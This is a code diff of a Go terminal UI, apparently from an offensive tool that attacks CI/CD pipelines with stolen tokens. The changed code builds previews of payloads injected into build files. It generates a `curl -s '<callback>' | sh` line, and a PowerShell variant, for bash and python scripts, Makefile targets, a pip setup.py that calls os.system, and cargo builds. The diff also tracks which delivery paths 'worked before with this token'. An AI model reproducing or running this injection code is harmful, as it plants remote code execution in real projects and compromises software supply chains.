@@ -1657,10 +1657,7 @@ func (m *Model) buildWizardStep2Content(width int) []string {
 			label += successColor.Render(" Recommended")
 		}
 		switch state {
-		case deployStateConfirmed:
-			label += successColor.Render(" (worked before)")
-			desc = mutedColor.Render(desc)
-		case deployStatePass:
+		case deployStateConfirmed, deployStatePass:
 			desc = mutedColor.Render(desc)
 		case deployStateUnknown:
 			if reason != "" {
@@ -1817,8 +1814,6 @@ func (m *Model) buildWizardStep3Content(width int) []string {
 		)
 		state, reason := m.commentTargetStatus(currentTarget)
 		switch {
-		case state == deployStateConfirmed:
-			lines = append(lines, formatWizardContent(pad, "", successColor.Render("This path worked before with this token"), innerWidth))
 		case state == deployStateUnknown && reason != "":
 			lines = append(lines, formatWizardContent(pad, "", warningColor.Render(reason), innerWidth))
 		case (state == deployStateFail || state == deployStateDenied) && reason != "":
@@ -1988,8 +1983,6 @@ func (m *Model) buildWizardStep3Content(width int) []string {
 	if m.wizard.DeliveryMethod != DeliveryLOTP {
 		statusState, statusReason := m.deliveryMethodStatus(m.wizard.DeliveryMethod)
 		switch statusState {
-		case deployStateConfirmed:
-			lines = append(lines, formatWizardContent(pad, "", successColor.Render("This path worked before with this token"), innerWidth), emptyLine)
 		case deployStateUnknown:
 			if statusReason != "" {
 				lines = append(lines, formatWizardContent(pad, "", warningColor.Render(statusReason), innerWidth), emptyLine)
@@ -2366,20 +2359,22 @@ func summarizePackageJSONPreview(lines []string) []string {
 	return lines[scriptsIdx:end]
 }
 
-func lotpPreviewCurlPipeShCommand(callbackURL string) string {
-	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
-}
-
 func lotpFallbackPreviewLines(tool, callbackURL string, hasTargets bool) []string {
-	curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
+	curlCmd := lotp.CurlPipeShCommand(callbackURL)
 	switch tool {
-	case "bash", "powershell", "python":
+	case "bash", "python":
 		if hasTargets {
 			return []string{curlCmd, "... (rest of existing script) ..."}
 		}
 		return []string{curlCmd}
+	case "powershell":
+		powershellCmd := lotp.PowershellCurlPipeShCommand(callbackURL)
+		if hasTargets {
+			return []string{powershellCmd, "... (rest of existing script) ..."}
+		}
+		return []string{powershellCmd}
 	case "make":
-		return []string{"all:", "\t@" + curlCmd, "\t@$(MAKE) -f Makefile.real all"}
+		return []string{"all:", "\t@" + curlCmd}
 	case "pip":
 		return []string{"import os", "os.system(" + fmt.Sprintf("%q", curlCmd) + ")", "setup(name='pkg', version='1.0.0')"}
 	case "cargo":
